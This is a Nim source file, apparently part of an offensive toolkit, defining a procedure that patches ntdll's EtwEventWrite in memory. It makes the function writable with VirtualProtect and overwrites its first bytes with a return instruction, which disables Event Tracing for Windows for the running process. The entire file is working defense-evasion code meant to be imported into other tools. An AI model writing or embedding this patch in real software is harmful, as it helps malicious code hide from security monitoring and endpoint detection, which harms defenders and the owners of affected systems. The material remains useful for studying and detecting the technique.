import winim/lean
import dynlib

when defined amd64:
    # x64
    const patch: array[1, byte] = [byte 0xc3]
elif defined i386:
    # x86
    const patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]

proc Patchntdll*(): bool =
    var
        ntdll: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    ntdll = loadLib("ntdll")
    if isNil(ntdll):
        echo "[X] Failed to load ntdll.dll"
        return disabled

    cs = ntdll.symAddr("EtwEventWrite") # equivalent of GetProcAddress()
    if isNil(cs):
        echo "[X] Failed to get the address of 'EtwEventWrite'"
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        echo "[*] Applying patch"
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true

    return disabled

when isMainModule:
    echo "This is a library file and should be imported, not run directly."